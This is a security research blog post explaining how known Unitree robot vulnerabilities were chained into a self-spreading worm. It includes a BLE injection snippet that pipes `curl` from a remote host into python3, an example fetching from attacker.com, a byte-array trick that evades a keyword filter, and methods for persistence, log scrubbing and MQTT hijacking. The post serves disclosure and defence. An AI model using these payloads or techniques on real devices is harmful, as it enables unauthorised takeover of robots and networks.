---
layout: post
title: "Anatomy of a Robot Worm"
date: 2026-06-12
tags: [security, robotics, unitree]
---

In September 2025, three researchers, (Bin4ry, h0stile, legion1581) published a critical vulnerability in Unitree's entire robot product line. CVE-2025-35027: a command injection in the BLE WiFi configuration service, exploitable from 30 feet away, running as root. Every Go2, G1, H1, B2, and X1 ever shipped was vulnerable. 

A few months later, Olivier Laflamme (Boshcko) and Ruikai Peng independently found CVE-2026-27509: the `programming_actuator` service accepts Python uploads over the local network and executes them as root.

Both findings were single-target, operator-at-keyboard exploits. One robot at a time with a manual trigger. After the initial drop of Unipwn I was obsessed with a question: **can these be chained into a self-propagating, robot-to-robot worm?** Like actually built, actually tested, actually spreading autonomously across real hardware. Robots moving around and hacking other robots. 

The answer, it turns out, is yes! This is how it works.

*Note: These findings were initially disclosed at WISCON 2026.*

---

## What's Inside a $1,600 Robot

Before anything else, we need a mental model of the Go2's attack surface. There are five components that matter.

**BLE WiFi configuration service.** This is CVE-2025-35027's target. UUID `0000ffe0`, exposed over Bluetooth Low Energy, range roughly 30 feet. Prior to the latest patch in May 2026, the entire product line shared the same AES-128 key (`df98b715...`), the same IV, and the same handshake secret: the literal string `"unitree"`. The SSID and password fields are passed directly to `wpa_supplicant` without sanitization. Shell injection format: `";$(command);#"`. This is how the worm gets its first robot.

**WebRTC bridge.** The process `unitreeWebRTCClientMaster` is how the Unitree phone app controls the robot. It listens on port 9991 for HTTP signaling, establishes WebRTC data channels, and relays commands to the robot's internal bus. It sits on the LAN side. Critically, it has no client authentication. It just hands its RSA public key to any device that connects. This is entry point number two.

**DDS bus.** The robot's internal nervous system. CycloneDDS, 20+ processes, all communicating via multicast on `239.255.0.1:7400`. Motor control, telemetry, sensor fusion, inter-process coordination. Everything flows through DDS. After Boshcko's disclosure, Unitree pushed DDS Security over OTA: PKI-DH mutual authentication, per-device certificates, encrypted discovery. On patched robots, external participants can see announcements but can't complete the handshake. We'll come back to why it doesn't matter.

**programming_actuator.** A module loader that accepts Python uploads, binds them to controller hotkeys, and executes them as root. This is the execution primitive at the end of every attack chain. Upload code, trigger it, and it runs with full system privileges.

**MQTT (ota_boxed).** The cloud tether. On every boot, the robot connects to `global-robot-mqtt.unitree.com:17883` over TLS, subscribes to a command channel, and waits for instructions. Firmware updates, feature flags, telemetry — all flow through this pipe. The auth is serial-based: `MD5("unitree-" + serial + "-" + nonce)`, where the serial number is printed on the bottom of the robot and broadcast over BLE. This is a persistence mechanism, but not a viable initial vector.

```
                ┌─────────────────────────────────┐
                │          Unitree Go2             │
                │                                  │
BLE ◄───────────┤  WiFi config service             │
(30 ft)         │  (hardcoded AES, no real auth)   │
                │                                  │
                │  ┌──────────────────────┐        │
Phone/LAN ◄─────┤  │  WebRTC bridge       │        │
                │  │  (HTTP signaling,     │        │
                │  │   no client auth)     │        │
                │  └──────────┬───────────┘        │
                │             │                    │
                │  ┌──────────▼───────────┐        │
                │  │  DDS bus             │        │
                │  │  (multicast, 20+     │        │
                │  │   processes)         │        │
                │  └──────────┬───────────┘        │
                │             │                    │
                │  ┌──────────▼───────────┐        │
                │  │  programming_actuator│        │
                │  │  (root execution)    │        │
                │  └──────────────────────┘        │
                │                                  │
Unitree Cloud ◄─┤  MQTT (ota_boxed)                │
(Internet)      │  serial-based auth               │
                └─────────────────────────────────┘
```

Two entry points (BLE and WebRTC), and an execution primitive (programming_actuator), a pretty solid persistence mechanism (MQTT). And of course the DDS bus tying it all together.

---

## Phase 1: Patient Zero

The scenario: Walking a conference floor, a Unitree Go2 is demoing at a booth ~20 feet away.

The BLE exploit is six GATT writes:

```python
exploit = UnitreeExploit(device)
await exploit.connect()                    # BLE GATT connection
await exploit.send_handshake()             # sends "unitree"
await exploit.get_serial_number()          # confirms access
await exploit.init_wifi_mode(2)            # STA mode
await exploit.set_ssid("ConferenceWiFi")   # real network SSID
await exploit.set_password('RealPass";$(curl -sk mal.tw/s0|python3);#')
await exploit.set_country_code("US")       # TRIGGER
```

The country code setter fires `wpa_supplicant` reconfiguration. `wpa_supplicant` processes the password field, hits the shell injection, and executes `curl -sk mal.tw/s0 | python3` as root. (Mal.tw is my site for short URL needs. No payloads are currently active there.)

There's a trick in the WiFi-mode injection: the real WiFi password is prepended to the payload. The robot joins the network *and* gets compromised simultaneously. This is optional.

The injected command downloads and runs the Stage 0 dropper. Within around 45 seconds, the robot beacons to the C2 server. It appears in the dashboard. It's still standing at the booth, dancing around or waving or whatever.

In the real scenario, this is just autopwning from a raspberry pi or phone in your pocket. The exploit takes about five seconds to drop, and we now have patient zero.

---

## The Payload Chain

The worm installs itself in three stages. There's a hard design constraint shaping all of this: the Go2 ships with Python 3 but no pip, no venv, no package manager. Every byte of the payload has to run on the stdlib alone.

### Stage 0: The Dropper

Roughly 500 bytes of Python. Injected via `curl -sk <C2>/s0 | python3` through the BLE exploit.

It does three things: generates a unique robot ID from the hostname and MAC address, sends a beacon to the C2 server (`POST /beacon`) so the robot immediately appears in the operator's dashboard, and downloads Stage 1. That's it. Small on purpose since the BLE characteristic has limited payload space. The dropper's only job is to establish contact and pull the next stage.

### Stage 1: The Downloader

About 300 bytes. Fetched and `exec()`'d by Stage 0.

Downloads Stage 2 from the C2, writes it to `/usr/local/bin/unitree-updater`, makes it executable, and launches it as a detached background process. The two-step (dropper → downloader → agent) exists because Stage 0 needs to be tiny enough to fit in an injection payload, and Stage 2 needs to be a persistent file on disk.

### Stage 2: The Worm Agent

Around 1,100 lines of self-contained, stdlib-only Python. The C2 URL and API key are baked in at serve time — the C2 server replaces `__C2_URL__` and `__API_KEY__` placeholders when a robot requests `/s2`.

This is the core of the worm. It runs as a background daemon and does the following:

**Beaconing.** POST to `/beacon` at jittered 60–300 second intervals. The jitter avoids traffic fingerprinting.

**Task execution.** Polls the C2 for pending tasks, executes them, reports results. Task types include `EXECUTE_CMD` (run a shell command), `COLLECT_INTEL` (dump hostname, kernel version, network interfaces, running processes, cron jobs), and `SELF_DESTRUCT` (remove persistence, delete the agent binary, kill itself).

**Persistence.** Four layers: a systemd service (`unitree-service.service`, enabled and started), a cron `@reboot` entry, an rc.local fallback for non-systemd environments, and a watchdog process that monitors the agent and restarts it if killed. You have to remove all four to fully clean it.

**Process obfuscation.** The agent renames itself to look like a kernel thread: `[kworker/0:1]`, `systemd-udevd`, `systemd-journald`, `dbus-daemon`. A quick `ps aux` won't reveal anything unusual.

**Log cleaning.** Scrubs syslog, auth.log, and bash_history for worm-related keywords. 

**MQTT redirect.** The agent rewrites `/etc/hosts` to point `global-robot-mqtt.unitree.com` and `robot-mqtt.unitree.com` at the C2 server. The robot's OTA daemon (`ota_boxed`) reconnects on its next cycle — typically within 10 seconds — and now takes orders from the attacker's MQTT broker instead of Unitree's cloud.

---

## Phase 2: Autonomous LAN Propagation

Patient zero was compromised at a conference. It goes back to the office LAN with other robots.

### Discovery

CycloneDDS uses the Simple Participant Discovery Protocol (SPDP): every DDS participant announces itself via UDP multicast on `239.255.0.1:7400`. No authentication required. Even on robots with DDS Security enabled, SPDP announcements are visible to any device on the L2 segment.

The worm listens for participants that subscribe to `rt/webrtcreq`, the topic the WebRTC bridge uses to receive signaling messages. Finding that subscriber means finding another robot's WebRTC bridge, which is another target.

### The SDP Overflow

The WebRTC bridge's SDP parser comes from Amazon's Kinesis Video Streams WebRTC SDK — an open-source C library (`awslabs/amazon-kinesis-video-streams-webrtc-sdk-c`). In `parseMediaAttributes()`, when an SDP attribute line contains a colon (`a=name:value`), the attribute name is copied into a fixed 33-byte buffer without a bounds check. The no-colon path and the value-copy path both correctly use `MIN()` to cap the length. Only the name-copy-with-colon path is missing it.

This is a supply chain bug. Amazon wrote it in 2019. Unitree consumed the SDK. Every device built on it inherited the vulnerability.

The worm exploits this by publishing a crafted SDP to `rt/webrtcreq` via DDS multicast. The SDP contains 5 media descriptions with 256 attributes in the final section. The overflow is 2 bytes — just enough to corrupt `sessionAttributesCount`, bumping it from 255 to 257. The parser then reads past its own array boundary, picking up a forged SHA-256 DTLS fingerprint from a fake media description the attacker controls.

After the overflow, the target's `PeerConnection` trusts the attacker's DTLS certificate. A 2-byte corruption turns into a forged cryptographic identity.

I've reported this through AWS's Vulnerability Disclosure Program. It was patched in SDK version 1.18.1. Unitree robots in the field still run the unpatched version. (A separate blog post will cover the full details of this finding once the HackerOne process concludes.)

### The Data Channel

ICE/DTLS completes using the forged fingerprint. The worm uploads a Python payload via `programming_actuator` (api_id 1002) and binds it to the controller hotkey L1+Y.

### The Trigger

The payload is on the target and bound to a hotkey. Now it needs to execute without a physical controller.

The worm publishes a `WirelessController_` struct to `rt/wirelesscontroller` via DDS multicast. The struct has `keys=2050`, the bitmask for L1+Y. The `programming_actuator` process reads this topic and executes the bound payload as root.

A few bytes of UDP multicast and we are off to the races.

### The Cycle

The payload downloads and runs the Stage 0 dropper. The newly infected robot beacons to C2, installs persistence, and begins its own DDS discovery cycle. Robot A infects Robot B. Robot B discovers Robot C. The worm spreads across every robot on the broadcast domain.

---

## The C2

The command-and-control server is a FastAPI application backed by SQLite, deployed to a $5/month Linode behind nginx and Let's Encrypt. It serves the three payload stages, accepts beacons, dispatches tasks, and provides a web dashboard for the operator.

The dashboard tracks every infected robot with last-seen timestamps and visualizes the infection chain: which robot infected which, and at what depth. The operator can send shell commands to individual robots or broadcast to the entire fleet, collect system intelligence, control propagation, or trigger self-destruct.

The MQTT broker component is the persistence play. Infected robots whose `/etc/hosts` has been redirected connect to this broker instead of Unitree's cloud. The operator can push OTA commands through the robot's own update mechanism. Firmware updates, configuration changes, arbitrary code execution can be pushed through the legitimate OTA pipeline, just pointed at a different server.

---

## Four Defenses, Four Bypasses

Since the original CVEs were published, Unitree has shipped several patches. Here's how to bypass all of them.

### Defense 1: DDS Security

After Boshcko's disclosure, Unitree pushed DDS Security over OTA. PKI-DH mutual authentication with per-device certificates signed by a Unitree CA. Encrypted discovery. On patched robots, an external device on the LAN can see SPDP announcements but can never complete the DDS handshake. We tested this with the robot's own stolen certificates and the key exchange rejected them.

So Boshcko's direct-DDS attack is dead on patched robots. This is a solid fix, credit to Unitree for shipping it.

But if we look at the architecture diagram again...

The WebRTC bridge is already an authenticated DDS participant with PKI certs and it's inside the security perimeter. It also accepts connections from any device on the LAN over plaintext HTTP on port 9991. Connect to the bridge, send commands through the data channel, and the bridge faithfully relays them to the internal DDS bus. Motor control, `programming_actuator` uploads, controller button presses. We tested each one on live hardware, and the bridge relays everything except `rt/api/master_service/request`.

So we don't need to break DDS Security, we just sort of tip-toe around it. The analogy: a building with biometric locks on every door, but a receptionist window open to the street. The receptionist has a badge and will carry any package to any room in the building.

### Defense 2: WebRTC Signaling Encryption

The bridge isn't entirely unprotected. Port 9991 uses a per-device RSA key exchange. Your first request returns the robot's RSA public key. You generate an AES session key, encrypt your SDP offer with it, encrypt the AES key with RSA, and send both. The response comes back AES-encrypted.

The problem: there's no client authentication. The robot hands its public key to anyone who asks. Any device on the LAN can complete this handshake. The encryption protects against passive eavesdropping, but it does nothing against an active attacker on the same network.

Encryption without identity verification is not access control. This appears to be a common pattern in IoT. Loads of crypto, but no proof of who you're talking to.

### Defense 3: Keyword Blocklist

On firmware ~1.1.13+, the `programming_actuator` adds a keyword blocklist: around 200 terms, substring-matched against uploaded source code. `import`, `subprocess`, `os.system`, `exec`, `eval`, `socket`, `open`, `__builtins__`. If any of these strings appear anywhere in your upload, it's silently rejected. The upload returns status 0 (success), but the payload is never written to disk.

The bypass: encode blocked keywords as integer byte arrays.

```python
# Blocked:
import os
os.system("curl attacker.com/payload | sh")

# Not blocked:
code = bytes([105, 109, 112, 111, 114, 116, 32, 111, 115, ...])
# "exec" is blocked too, but:
e = getattr(__builtins__, bytes([101,120,101,99]).decode())
e(code)
```

The blocklist checks the source code as a string. Byte arrays aren't strings. Reconstruct the blocked keywords at runtime from integer arrays, and the filter never sees them. Every keyword in the blocklist can be bypassed this way.

The silent failure is its own antipattern: the developer testing their filter sees status 0 for both accepted and rejected uploads and has no way to distinguish them from the API response alone.

### Defense 4: MQTT Authentication

Every robot authenticates to Unitree's cloud MQTT broker with `MD5("unitree-" + serial + "-" + nonce)`. The serial number is printed on the bottom of the robot, broadcast over BLE, and visible in the app. The entire auth scheme derives from a single public value. I connected to Unitree's cloud broker from my Mac Mini. `CONNACK rc=0` — authenticated.

The good news: Unitree has topic-level ACLs on the cloud broker. You can authenticate and eavesdrop on OTA commands (`cmd/<serial>`), but you can't publish commands. The broker ACKs your publish and quietly throws it away. Internet-scale RCE through the cloud is off the table for now.

The bad news: We can run our own broker. 

---

## What We Released 

This research produced three tools.

**[UniRoam](https://github.com/a-bissell/uniroam-defanged)** is the worm framework. The full autonomous propagation engine: BLE exploit chain, three-stage payload system, C2 server and dashboard. The point of building it was to prove the threat model and demonstrate it at [WISCON 2026](https://wiscon.wiscoweb.com/). 

**[UnLeash Lite](https://github.com/a-bissell/UnLeash-Lite)** is the single-target jailbreak. Same WebRTC bridge bypass, same `programming_actuator` upload, same controller trigger — but one robot at a time, owner-initiated, and no worm capability. One-command root access to your own robot. Works on firmware 1.1.7 through 1.1.15, includes the keyword blocklist bypass for newer firmware. MIT license.

**[Canopy](https://github.com/a-bissell/canopy)** is self-hosted fleet management. It's an MQTT broker that sits between your robots and Unitree's cloud. Same rogue broker architecture, but run by your IT team instead of an attacker. Custom OTA, admin-approved firmware, audit logging, and your telemetry stays on-prem.

---

## What Should Be Done

**If you own a Unitree robot:** [UnLeash Lite](https://github.com/a-bissell/UnLeash-Lite) gives you root access. Block cloud MQTT if you don't want Unitree pushing updates without your consent. Monitor for unauthorized WebRTC connections on port 9991.

**If your organization deploys a robot fleet:** [Canopy](https://github.com/a-bissell/canopy) gives you fleet control. Put robots on an isolated VLAN — there is no reason they should share a broadcast domain with your workstations. Treat robots as endpoints, not appliances. They run Linux. They have cameras and microphones. They move.

**What Unitree should fix:** Client authentication on the WebRTC bridge. Code signing for `programming_actuator` uploads — not a string-matching blocklist. Unique per-device cryptographic credentials for MQTT — not serial-derived MD5. And an owner consent mechanism for cloud-pushed updates.

---

## Acknowledgments

This work builds directly on the research of Andreas Makris (Bin4ry), Kevin Finisterre (h0stile), and Konstantin Severov (legion1581) — CVE-2025-35027 — and Olivier Laflamme (Boshcko) and Ruikai Peng — CVE-2026-27509. They found the doors. I just built what walks through them.

The SDP overflow in the AWS KVS WebRTC SDK was reported through AWS's Vulnerability Disclosure Program and patched in v1.18.1.

This research was presented at [WISCON 2026](https://wiscon.wiscoweb.com/) on June 11, 2026 in Madison, Wisconsin. All findings involving zero-day vulnerabilities were disclosed architecturally — no working exploit code was published.

---

*Alexander Bissell*
